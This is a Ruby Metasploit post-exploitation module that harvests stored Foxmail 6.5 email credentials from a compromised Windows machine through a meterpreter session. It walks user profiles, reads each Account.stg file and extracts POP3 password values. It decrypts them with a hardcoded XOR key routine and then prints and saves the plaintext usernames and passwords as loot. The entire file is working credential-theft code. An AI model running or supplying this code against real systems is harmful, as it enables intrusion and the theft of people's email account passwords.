class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Registry
  include Msf::Post::File
  include Msf::Auxiliary::Report
  include Msf::Post::Windows::UserProfiles

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'FoxMail 6.5 Credential Harvester',
      'Description'   => %q{
This Module Finds and Decrypts Stored Foxmail 6.5 Credentials
      },
      'License'       => MSF_LICENSE,
      'Author'        => ['Nipun Jaswal'],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))
  end
def run
  profile = grab_user_profiles()
  counter = 0
  data_entry = ""
  profile.each do |user|
  if user['LocalAppData']
  full_path = user['LocalAppData']
  full_path = full_path+"\\VirtualStore\\Program Files (x86)\\Tencent\\Foxmail\\mail"
  if directory?(full_path)
  print_good("Fox Mail Installed, Enumerating Mail Accounts")
  session.fs.dir.foreach(full_path) do |dir_list|
  if dir_list =~ /@/
  counter=counter+1
  full_path_mail = full_path+ "\\" + dir_list + "\\" + "Account.stg"
  if file?(full_path_mail)
  print_good("Reading Mail Account #{counter}")
  file_content = read_file(full_path_mail).split("\n")
  file_content.each do |hash|
  if hash =~ /POP3Password/
  hash_data = hash.split("=")
  hash_value = hash_data[1]
  if hash_value.nil?
  print_error("No Saved Password")
  else
  print_good("Decrypting Password for mail account: #{dir_list}")
  decrypted_pass = decrypt(hash_value,dir_list)
  data_entry << "Username:" +dir_list + "\t" + "Password:" + decrypted_pass+"\n"
  end
  end
  end
  end
  end
  end
  end
  end
  end
  store_loot("Foxmail Accounts","text/plain",session,data_entry,"Fox.txt","Fox Mail Accounts")
  end
def decrypt(hash_real,dir_list)
  decoded = ""
  magic = Array[126, 100, 114, 97, 71, 111, 110, 126]
  fc0 = 90
  size = (hash_real.length)/2 - 1
  index = 0
  b = Array.new(size)
  for i in 0 .. size do
  b[i] = (hash_real[index,2]).hex
  index = index+2
  end
  b[0] = b[0] ^ fc0
  double_magic = magic+magic
  d = Array.new(b.length-1)
  for i in 1 .. b.length-1 do
  d[i-1] = b[i] ^ double_magic[i-1]
  end
  e = Array.new(d.length)
  for i in 0 .. d.length-1
  if (d[i] - b[i] < 0)
  e[i] = d[i] + 255 - b[i]
  else
  e[i] = d[i] - b[i]
  end
  decoded << e[i].chr
  end
  print_good("Found Username #{dir_list} with Password: #{decoded}")
  return decoded
  end
  end

